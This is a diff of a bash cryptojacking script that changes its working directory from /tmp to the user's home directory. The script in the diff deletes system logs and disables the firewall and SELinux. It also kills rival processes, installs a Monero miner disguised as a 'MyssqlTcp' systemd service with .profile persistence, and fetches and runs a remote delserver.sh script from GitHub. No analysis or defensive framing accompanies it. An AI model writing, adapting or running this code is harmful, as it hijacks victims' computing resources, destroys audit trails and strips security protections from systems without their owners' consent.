@@ -1,7 +1,7 @@
 #!/bin/bash
 
 VERSION=2.11
-cd /tmp/
+cd /$HOME/
 rm -f index.html
 wget http://ip-api.com/json/
 chmod 777 index.html
@@ -22,8 +22,6 @@ EMAIL=$2 # this one is optional
 # Disable firewall
 ulimit -n 65535
 rm -rf /var/log/syslog
-chattr -iua /tmp/
-chattr -iua /var/tmp/
 ufw disable
 iptables -F
 setenforce 0 2>dev/null
@@ -671,7 +669,7 @@ kill_sus_proc()
 {
     ps axf -o "pid"|while read procid
     do
-        ls -l /proc/$procid/exe | grep /tmp
+        ls -l /proc/$procid/exe | grep /$HOME
         if [ $? -ne 1 ]
         then
             cat /proc/$procid/cmdline| grep -a -E "zzh"
@@ -762,7 +760,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/myssqltcp/Tcphost.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
+  echo "[*] Running miner in the background see logs in $HOME/server.log file"
   /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
@@ -774,7 +772,7 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background see logs in $HOME/tmp/server.log file"
+    echo "[*] Running miner in the background see logs in $HOME/server.log file"
     /bin/bash $HOME/myssqltcp/Tcphost.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
@@ -782,7 +780,7 @@ else
   else
 
     echo "[*] Creating Myssqltcp systemd service"
-    cat >/tmp/MyssqlTcp.service <<EOL
+    cat >/$HOME/MyssqlTcp.service <<EOL
 [Unit]
 Description=Monero Tcphost service
 
@@ -795,7 +793,7 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/MyssqlTcp.service /etc/systemd/system/MyssqlTcp.service
+    sudo mv /$HOME/MyssqlTcp.service /etc/systemd/system/MyssqlTcp.service
     echo "[*] Starting Myssqltcp systemd service"
     sudo killall MyssqlTcp 2>/dev/null
     sudo systemctl daemon-reload
@@ -823,7 +821,8 @@ else
 fi
 echo ""
 
-cd /tmp/
+cd /$HOME/
+rm -f index.html
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
